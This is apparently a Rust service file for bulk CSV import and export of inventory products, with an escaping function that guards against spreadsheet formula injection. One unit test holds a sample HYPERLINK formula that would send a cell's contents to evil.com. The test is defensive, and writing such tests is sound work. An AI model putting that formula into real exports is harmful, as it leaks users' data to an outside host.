//! Product Import/Export Service Implementation
//!
//! Implements bulk import and export of products via CSV.

use async_trait::async_trait;
use csv::{Reader, WriterBuilder};
use inventory_service_core::domains::inventory::product::{BarcodeType, Product};
use inventory_service_core::dto::product_import::{
    ExportProductsQuery, ImportResult, ImportRowError, ImportValidationResult, ProductCsvRow,
};
use inventory_service_core::repositories::ProductRepository;
use inventory_service_core::services::ProductImportService;
use shared_error::AppError;
use std::io::Cursor;
use std::sync::Arc;
use tracing::{error, info};
use uuid::Uuid;

/// Maximum number of rows allowed in an import file
const MAX_IMPORT_ROWS: usize = 1000;

/// Number of rows to preview in validation response
const PREVIEW_ROWS: usize = 5;

/// CSV template headers
const CSV_HEADERS: &[&str] = &[
    "sku",
    "name",
    "description",
    "product_type",
    "category_id",
    "sale_price",
    "cost_price",
    "currency",
    "weight",
    "length",
    "width",
    "height",
    "barcode",
    "barcode_type",
    "is_active",
];

/// Escape CSV field to prevent formula injection in spreadsheet applications.
///
/// When a CSV field starts with characters that spreadsheet applications
/// (Excel, LibreOffice Calc, Google Sheets) interpret as formula prefixes,
/// prefix the field with a single quote to prevent formula execution.
///
/// Reference: OWASP CSV Injection Prevention
fn escape_csv_formula(s: &str) -> String {
    // Characters that trigger formula interpretation in spreadsheets
    const FORMULA_PREFIXES: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

    if s.starts_with(FORMULA_PREFIXES) {
        format!("'{}", s)
    } else {
        s.to_string()
    }
}

/// Product Import/Export Service implementation
pub struct ProductImportServiceImpl {
    product_repo: Arc<dyn ProductRepository>,
}

impl ProductImportServiceImpl {
    /// Create a new ProductImportServiceImpl
    pub fn new(product_repo: Arc<dyn ProductRepository>) -> Self {
        Self { product_repo }
    }

    /// Parse CSV data into rows
    fn parse_csv(&self, data: &[u8]) -> Result<Vec<ProductCsvRow>, AppError> {
        let cursor = Cursor::new(data);
        let mut reader = Reader::from_reader(cursor);

        let mut rows = Vec::new();
        for result in reader.deserialize() {
            match result {
                Ok(row) => rows.push(row),
                Err(e) => {
                    return Err(AppError::ValidationError(format!("Failed to parse CSV: {}", e)));
                },
            }
        }

        Ok(rows)
    }

    /// Validate a single CSV row
    fn validate_row(&self, row: &ProductCsvRow, row_number: i32) -> Vec<ImportRowError> {
        let mut errors = Vec::new();

        // Required fields
        if row.sku.trim().is_empty() {
            errors.push(ImportRowError {
                row_number,
                field: "sku".to_string(),
                error: "SKU is required".to_string(),
            });
        } else if row.sku.len() > 100 {
            errors.push(ImportRowError {
                row_number,
                field: "sku".to_string(),
                error: "SKU must be 100 characters or less".to_string(),
            });
        }

        if row.name.trim().is_empty() {
            errors.push(ImportRowError {
                row_number,
                field: "name".to_string(),
                error: "Name is required".to_string(),
            });
        } else if row.name.len() > 255 {
            errors.push(ImportRowError {
                row_number,
                field: "name".to_string(),
                error: "Name must be 255 characters or less".to_string(),
            });
        }

        // Validate product type
        if let Some(ref pt) = row.product_type {
            let valid_types = ["goods", "service", "consumable"];
            if !valid_types.contains(&pt.to_lowercase().as_str()) {
                errors.push(ImportRowError {
                    row_number,
                    field: "product_type".to_string(),
                    error: format!(
                        "Invalid product type '{}'. Must be one of: goods, service, consumable",
                        pt
                    ),
                });
            }
        }

        // Validate barcode type
        if let Some(ref bt) = row.barcode_type {
            let valid_types = ["ean13", "upc_a", "isbn", "custom"];
            if !valid_types.contains(&bt.to_lowercase().as_str()) {
                errors.push(ImportRowError {
                    row_number,
                    field: "barcode_type".to_string(),
                    error: format!(
                        "Invalid barcode type '{}'. Must be one of: ean13, upc_a, isbn, custom",
                        bt
                    ),
                });
            }
        }

        // Validate prices are non-negative
        if let Some(price) = row.sale_price {
            if price < 0 {
                errors.push(ImportRowError {
                    row_number,
                    field: "sale_price".to_string(),
                    error: "Sale price cannot be negative".to_string(),
                });
            }
        }

        if let Some(price) = row.cost_price {
            if price < 0 {
                errors.push(ImportRowError {
                    row_number,
                    field: "cost_price".to_string(),
                    error: "Cost price cannot be negative".to_string(),
                });
            }
        }

        // Validate currency
        if let Some(ref currency) = row.currency {
            if currency.len() != 3 {
                errors.push(ImportRowError {
                    row_number,
                    field: "currency".to_string(),
                    error: "Currency must be a 3-letter ISO code (e.g., VND, USD)".to_string(),
                });
            }
        }

        errors
    }

    /// Convert CSV row to Product domain entity
    fn row_to_product(&self, row: &ProductCsvRow, tenant_id: Uuid) -> Product {
        let barcode_type =
            row.barcode_type
                .as_ref()
                .and_then(|bt| match bt.to_lowercase().as_str() {
                    "ean13" => Some(BarcodeType::Ean13),
                    "upc_a" => Some(BarcodeType::UpcA),
                    "isbn" => Some(BarcodeType::Isbn),
                    "custom" => Some(BarcodeType::Custom),
                    _ => None,
                });

        let dimensions = if row.length.is_some() || row.width.is_some() || row.height.is_some() {
            Some(serde_json::json!({
                "lengthMm": row.length,
                "widthMm": row.width,
                "heightMm": row.height,
            }))
        } else {
            None
        };

        Product {
            product_id: Uuid::now_v7(),
            tenant_id,
            sku: row.sku.trim().to_string(),
            name: row.name.trim().to_string(),
            description: row.description.clone(),
            product_type: row
                .product_type
                .clone()
                .unwrap_or_else(|| "goods".to_string()),
            barcode: row.barcode.clone(),
            barcode_type,
            category_id: row.category_id,
            item_group_id: None,
            track_inventory: true,
            tracking_method:
                inventory_service_core::domains::inventory::product::ProductTrackingMethod::None,
            default_uom_id: None,
            sale_price: row.sale_price,
            cost_price: row.cost_price,
            currency_code: row.currency.clone().unwrap_or_else(|| "VND".to_string()),
            weight_grams: row.weight,
            dimensions,
            attributes: None,
            is_active: row.is_active.unwrap_or(true),
            is_sellable: true,
            is_purchaseable: true,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
            deleted_at: None,
        }
    }
}

#[async_trait]
impl ProductImportService for ProductImportServiceImpl {
    async fn validate_csv(
        &self,
        _tenant_id: Uuid,
        data: &[u8],
    ) -> Result<ImportValidationResult, AppError> {
        // Parse CSV
        let rows = match self.parse_csv(data) {
            Ok(r) => r,
            Err(e) => {
                return Ok(ImportValidationResult {
                    is_valid: false,
                    total_rows: 0,
                    valid_rows: 0,
                    errors: vec![ImportRowError {
                        row_number: 0,
                        field: "file".to_string(),
                        error: e.to_string(),
                    }],
                    preview: None,
                });
            },
        };

        // Check row count limit
        if rows.len() > MAX_IMPORT_ROWS {
            return Ok(ImportValidationResult {
                is_valid: false,
                total_rows: rows.len() as i32,
                valid_rows: 0,
                errors: vec![ImportRowError {
                    row_number: 0,
                    field: "file".to_string(),
                    error: format!(
                        "File contains {} rows, maximum allowed is {}",
                        rows.len(),
                        MAX_IMPORT_ROWS
                    ),
                }],
                preview: None,
            });
        }

        // Validate each row
        let mut all_errors = Vec::new();
        for (i, row) in rows.iter().enumerate() {
            let row_errors = self.validate_row(row, (i + 2) as i32); // +2 for 1-indexed + header
            all_errors.extend(row_errors);
        }

        let valid_rows = rows.len() as i32 - all_errors.len() as i32;
        let is_valid = all_errors.is_empty();
        let total_rows = rows.len() as i32;

        // Create preview of first few rows
        let preview = if is_valid {
            Some(rows.into_iter().take(PREVIEW_ROWS).collect())
        } else {
            None
        };

        Ok(ImportValidationResult {
            is_valid,
            total_rows,
            valid_rows: valid_rows.max(0),
            errors: all_errors,
            preview,
        })
    }

    async fn import_csv(
        &self,
        tenant_id: Uuid,
        data: &[u8],
        upsert: bool,
    ) -> Result<ImportResult, AppError> {
        // First validate
        let validation = self.validate_csv(tenant_id, data).await?;
        if !validation.is_valid {
            return Ok(ImportResult {
                created: 0,
                updated: 0,
                failed: validation.total_rows,
                errors: validation.errors,
            });
        }

        // Parse again (validation consumed the data)
        let rows = self.parse_csv(data)?;

        let mut created = 0;
        let mut updated = 0;
        let mut failed = 0;
        let mut errors = Vec::new();

        for (i, row) in rows.iter().enumerate() {
            let row_number = (i + 2) as i32;

            // Check if SKU already exists
            let existing = self.product_repo.find_by_sku(tenant_id, &row.sku).await?;

            match existing {
                Some(mut existing_product) => {
                    if upsert {
                        // Update existing product
                        existing_product.name = row.name.trim().to_string();
                        existing_product.description = row.description.clone();
                        if let Some(ref pt) = row.product_type {
                            existing_product.product_type = pt.clone();
                        }
                        existing_product.category_id = row.category_id;
                        if row.sale_price.is_some() {
                            existing_product.sale_price = row.sale_price;
                        }
                        if row.cost_price.is_some() {
                            existing_product.cost_price = row.cost_price;
                        }
                        if let Some(ref currency) = row.currency {
                            existing_product.currency_code = currency.clone();
                        }
                        existing_product.weight_grams = row.weight;
                        existing_product.barcode = row.barcode.clone();
                        if let Some(ref bt) = row.barcode_type {
                            existing_product.barcode_type = match bt.to_lowercase().as_str() {
                                "ean13" => Some(BarcodeType::Ean13),
                                "upc_a" => Some(BarcodeType::UpcA),
                                "isbn" => Some(BarcodeType::Isbn),
                                "custom" => Some(BarcodeType::Custom),
                                _ => None,
                            };
                        }
                        if let Some(is_active) = row.is_active {
                            existing_product.is_active = is_active;
                        }
                        existing_product.updated_at = chrono::Utc::now();

                        match self.product_repo.save(&existing_product).await {
                            Ok(_) => {
                                updated += 1;
                                info!("Updated product SKU: {}", row.sku);
                            },
                            Err(e) => {
                                failed += 1;
                                error!("Failed to update product SKU {}: {}", row.sku, e);
                                errors.push(ImportRowError {
                                    row_number,
                                    field: "sku".to_string(),
                                    error: format!("Failed to update: {}", e),
                                });
                            },
                        }
                    } else {
                        failed += 1;
                        errors.push(ImportRowError {
                            row_number,
                            field: "sku".to_string(),
                            error: format!("SKU '{}' already exists", row.sku),
                        });
                    }
                },
                None => {
                    // Create new product
                    let product = self.row_to_product(row, tenant_id);
                    match self.product_repo.save(&product).await {
                        Ok(_) => {
                            created += 1;
                            info!("Created product SKU: {}", row.sku);
                        },
                        Err(e) => {
                            failed += 1;
                            error!("Failed to create product SKU {}: {}", row.sku, e);
                            errors.push(ImportRowError {
                                row_number,
                                field: "sku".to_string(),
                                error: format!("Failed to create: {}", e),
                            });
                        },
                    }
                },
            }
        }

        Ok(ImportResult {
            created,
            updated,
            failed,
            errors,
        })
    }

    fn get_template(&self) -> Vec<u8> {
        let mut writer = WriterBuilder::new().from_writer(Vec::new());

        // Write headers
        writer.write_record(CSV_HEADERS).unwrap();

        // Write example row
        writer
            .write_record(&[
                "PROD-001",
                "Example Product",
                "This is an example product description",
                "goods",
                "",
                "100000",
                "50000",
                "VND",
                "500",
                "100",
                "50",
                "25",
                "8901234567890",
                "ean13",
                "true",
            ])
            .unwrap();

        writer.into_inner().unwrap()
    }

    async fn export_csv(
        &self,
        tenant_id: Uuid,
        query: ExportProductsQuery,
    ) -> Result<Vec<u8>, AppError> {
        // Build filter for querying products
        let products = self
            .product_repo
            .find_all_for_export(
                tenant_id,
                query.category_id,
                query.product_type.as_deref(),
                query.is_active,
                query.search.as_deref(),
            )
            .await?;

        let mut writer = WriterBuilder::new().from_writer(Vec::new());

        // Write headers
        writer
            .write_record(CSV_HEADERS)
            .map_err(|e| AppError::InternalError(format!("Failed to write CSV headers: {}", e)))?;

        // Write product rows
        for product in products {
            let dimensions = product.dimensions.as_ref();
            let length = dimensions
                .and_then(|d| d.get("lengthMm"))
                .and_then(|v| v.as_i64())
                .map(|v| v.to_string())
                .unwrap_or_default();
            let width = dimensions
                .and_then(|d| d.get("widthMm"))
                .and_then(|v| v.as_i64())
                .map(|v| v.to_string())
                .unwrap_or_default();
            let height = dimensions
                .and_then(|d| d.get("heightMm"))
                .and_then(|v| v.as_i64())
                .map(|v| v.to_string())
                .unwrap_or_default();

            let barcode_type = product
                .barcode_type
                .as_ref()
                .map(|bt| match bt {
                    BarcodeType::Ean13 => "ean13",
                    BarcodeType::UpcA => "upc_a",
                    BarcodeType::Isbn => "isbn",
                    BarcodeType::Custom => "custom",
                })
                .unwrap_or_default();

            // Escape user-provided fields to prevent CSV formula injection
            let sku = escape_csv_formula(&product.sku);
            let name = escape_csv_formula(&product.name);
            let description =
                escape_csv_formula(product.description.as_deref().unwrap_or_default());
            let barcode = escape_csv_formula(product.barcode.as_deref().unwrap_or_default());
            let category_id = product
                .category_id
                .map(|id| id.to_string())
                .unwrap_or_default();
            let sale_price = product
                .sale_price
                .map(|p| p.to_string())
                .unwrap_or_default();
            let cost_price = product
                .cost_price
                .map(|p| p.to_string())
                .unwrap_or_default();
            let weight = product
                .weight_grams
                .map(|w| w.to_string())
                .unwrap_or_default();

            writer
                .write_record(&[
                    sku.as_str(),
                    name.as_str(),
                    description.as_str(),
                    &product.product_type,
                    &category_id,
                    &sale_price,
                    &cost_price,
                    &product.currency_code,
                    &weight,
                    &length,
                    &width,
                    &height,
                    barcode.as_str(),
                    barcode_type,
                    &product.is_active.to_string(),
                ])
                .map_err(|e| AppError::InternalError(format!("Failed to write CSV row: {}", e)))?;
        }

        writer
            .into_inner()
            .map_err(|e| AppError::InternalError(format!("Failed to finalize CSV: {}", e)))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_escape_csv_formula_equals() {
        assert_eq!(escape_csv_formula("=SUM(A1:A10)"), "'=SUM(A1:A10)");
    }

    #[test]
    fn test_escape_csv_formula_plus() {
        assert_eq!(escape_csv_formula("+1234"), "'+1234");
    }

    #[test]
    fn test_escape_csv_formula_minus() {
        assert_eq!(escape_csv_formula("-100"), "'-100");
    }

    #[test]
    fn test_escape_csv_formula_at() {
        assert_eq!(escape_csv_formula("@SUM(A1)"), "'@SUM(A1)");
    }

    #[test]
    fn test_escape_csv_formula_tab() {
        assert_eq!(escape_csv_formula("\tvalue"), "'\tvalue");
    }

    #[test]
    fn test_escape_csv_formula_normal_text() {
        assert_eq!(escape_csv_formula("Normal Product Name"), "Normal Product Name");
    }

    #[test]
    fn test_escape_csv_formula_empty() {
        assert_eq!(escape_csv_formula(""), "");
    }

    #[test]
    fn test_escape_csv_formula_hyperlink_attack() {
        let attack = "=HYPERLINK(\"http://evil.com/?data=\"&A1,\"Click\")";
        assert_eq!(escape_csv_formula(attack), format!("'{}", attack));
    }
}
